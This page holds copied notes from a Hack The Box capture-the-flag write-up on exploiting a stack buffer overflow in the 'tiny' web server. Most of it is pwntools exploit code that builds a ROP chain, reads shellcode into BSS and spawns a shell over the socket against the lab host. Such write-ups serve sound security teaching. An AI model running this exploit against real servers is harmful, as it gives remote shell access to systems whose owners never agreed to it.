<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Binary Analysis and Exploitation</title>
</head><body>https://0xdf.gitlab.io/2018/11/24/htb-smasher-bof.html<br/>
<br/>
Vulnerability<br/>
The vulnerability comes because parse_request will handle up to 1024 bytes of filename, and the url_decode function will, without checking bounds, copy that much, despite the fact that the http_request struct only allows for 512 bytes of filename.<br/>
<br/>
So that means if I can write a filename longer than 0x2c8 - 0x90 = 0x238 = 568 bytes, when url_decode() writes to filename, it will overwrite rip, giving me control over the program.<br/>
<br/>
Strategy<br/>
To gain execution, I need to be able to get the RIP register pointing to shellcode that I give it. In the early days of exploitation, that could be as simple as writing shellcode onto the stack (in my input) and then overwriting rip with that address. However, with ASLR (which is on enabled in this case), guessing that address becomes infeasible. So, I’ll use return oriented programming, or ROP. ROP is basically using the last instruction (or last few instructions) from various functions in the binary to achieve steps towards what I want to accomplish.<br/>
<br/>
I am going to use the read function to read from the open socket, and save it to the BSS segment. I’ll need the address of read and BSS, and rop gadgets that will get the right arguments in place for those calls. Once I read shellcode into BSS, I’ll call it.<br/>
<br/>
Initial Attempt<br/>
============================================================<br/>
Skeleton<br/>
I’ll build an exploit script with pwntools. Start with a skeleton:<br/>
<br/>
#/usr/bin/env python<br/>
<br/>
from pwn import *<br/>
<br/>
# Set up context<br/>
elf = context.binary = ELF('./tiny', checksec=False)<br/>
HOST, PORT = "127.0.0.1", 1111<br/>
<br/>
# Build Payload<br/>
junk = "A" * 568 &nbsp;# junk to get to ret addr<br/>
payload = &nbsp;""<br/>
# rop will go here<br/>
<br/>
# Request<br/>
req = r'GET {}'.format(payload)<br/>
<br/>
# Send request<br/>
r.sendline(req)<br/>
r.sendline('')<br/>
<br/>
r.interactive()<br/>
============================================================<br/>
<br/>
Add Addresses<br/>
Add to the template code to get the BSS address and the address of read:<br/>
<br/>
# Get addresses<br/>
BSS = elf.get_section_by_name(".bss")["sh_addr"]<br/>
log.info("BSS address: {}".format(BSS))<br/>
read = elf.plt.read<br/>
log.info("plt read address: {}".format(read))<br/>
<br/>
<br/>
<br/>
<br/>
See Gadgets section<br/>
<br/>
<br/>
<br/>
Dup Shellcode<br/>
Next, I’ll use pwntools to generate shellcode to that will reuse the socket file descriptor for a sh that I can interact with. To use this function, I need the descriptor for the socket. I’ve noticed that when I run tiny locally, every time I make a request to it, it prints out the fd, and it’s consistently 4:<br/>
<br/>
root@kali:~/hackthebox/smasher-10.10.10.89# ./tiny 1111<br/>
listen on port 1111, fd is 3<br/>
accept request, fd is 4, pid is 2702<br/>
127.0.0.1:60506 200 - .<br/>
So I’ll add the following to my code, which will generate shellcode to run a shell over my current connection and send it over the socket:<br/>
<br/>
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))<br/>
<br/>
Now the exploit code looks like this:<br/>
============================================================<br/>
#/usr/bin/env python<br/>
<br/>
from pwn import *<br/>
<br/>
# Set up context<br/>
elf = context.binary = ELF('./tiny', checksec=False)<br/>
HOST, PORt = "127.0.0.1", 1111<br/>
<br/>
# Get addresses<br/>
BSS = elf.get_section_by_name(".bss")["sh_addr"]<br/>
log.info("BSS address: {}".format(BSS))<br/>
read = elf.plt.read<br/>
log.info("plt read address: {}".format(read))<br/>
<br/>
# Build Payload<br/>
junk = &nbsp;"A" * 568 &nbsp; &nbsp; &nbsp; &nbsp; # junk<br/>
payload = ""<br/>
payload += p64(0x4011dd) &nbsp;# pop rdi; ret<br/>
payload += p64(4) &nbsp; &nbsp; &nbsp; &nbsp; # socket descriptor<br/>
payload += p64(0x4011db) &nbsp;# pop rsi; pop r15; ret<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # BSS, to go to rsi<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # junk for r15<br/>
payload += p64(read) &nbsp; &nbsp; &nbsp;# read<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # return to shellcode<br/>
<br/>
# Request<br/>
req = r'GET {}'.format(junk + payload)<br/>
<br/>
# Send request<br/>
r.sendline(req)<br/>
r.sendline('')<br/>
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))<br/>
r.interactive()<br/>
============================================================<br/>
<br/>
Run It (and Fail) &nbsp;<br/>
Why Did That Fail? &nbsp;<br/>
<br/>
The first 1024 bytes of input is read into buf, and then sscanf is used to pull the first two strings out of it, in a normal case, something like “GET” and “/”. But if I look at the payload I sent (with the initial “A”s truncated), it looks like:<br/>
<br/>
...41414141dd114000000000000400000000000000db1140000000000060326000000000006032600000000000f00c4000000000006032600000000000<br/>
As soon as sscanf gets to that first null (00) byte, it stops.<br/>
<br/>
Success<br/>
Fortunately, the last thing the code does before writing bytes into the structure I can overflow is to url decode them. So that’s how I can get these bytes to the right place. By encoding the bytes, they will be strings, and then decoded into binary form as I need it.<br/>
<br/>
I’ll import quote from urllib in python.<br/>
<br/>
Now the code looks like this:<br/>
============================================================<br/>
#/usr/bin/env python<br/>
<br/>
from pwn import *<br/>
from urllib import quote as urlencode<br/>
<br/>
# url encode<br/>
def url_encode(s):<br/>
&nbsp; &nbsp; return ''.join(["%%%02x" % ord(x) for x in s])<br/>
<br/>
<br/>
# Set up context<br/>
elf = context.binary = ELF('./tiny', checksec=False)<br/>
#HOST, PORT = "127.0.0.1", 1111<br/>
HOST, PORT = "10.10.10.89", 1111<br/>
<br/>
# Get addresses<br/>
BSS = elf.get_section_by_name(".bss")["sh_addr"]<br/>
log.info("BSS address: {:02x}".format(BSS))<br/>
read = elf.plt.read<br/>
log.info("plt read address: {:02x}".format(read))<br/>
<br/>
# Build Payload<br/>
junk = "A" * 568 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;# junk<br/>
payload = ''<br/>
payload += p64(0x4011dd) &nbsp;# pop rdi; ret<br/>
payload += p64(4) &nbsp; &nbsp; &nbsp; &nbsp; # socket descriptor<br/>
payload += p64(0x4011db) &nbsp;# pop rsi; pop r15; ret<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # BSS, to go to rsi<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # junk for r15<br/>
payload += p64(read) &nbsp; &nbsp; &nbsp;# read<br/>
payload += p64(BSS) &nbsp; &nbsp; &nbsp; # return to shellcode<br/>
log.info('payload: {}'.format(urlencode(junk + payload)))<br/>
<br/>
req = r'GET {}'.format(urlencode(junk + payload))<br/>
<br/>
# Send request<br/>
r = remote(HOST, PORT)<br/>
r.sendline(req)<br/>
r.sendline('')<br/>
r.recvuntil('File not found')<br/>
r.sendline(asm(shellcraft.amd64.dupsh(4), arch="amd64"))<br/>
r.interactive()<br/>
============================================================</body></html>